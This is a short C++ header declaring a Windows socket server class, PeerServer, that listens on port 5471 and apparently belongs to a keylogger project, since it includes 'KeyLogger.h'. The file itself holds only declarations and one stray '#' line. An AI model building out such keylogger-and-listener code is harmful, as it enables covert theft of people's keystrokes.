#pragma once

#include <WinSock2.h>
#include <Windows.h>
#include <string>
#include <exception>
#include <iostream>
#include <vector>
#include <thread>
#include <map>
#include "KeyLogger.h"
#

#define PORT 5471

class PeerServer
{
public:
	PeerServer();
	~PeerServer();

	void run();
	void bindAndListen();

private:
	void handleConversation(SOCKET sock);

	SOCKET _listener;
};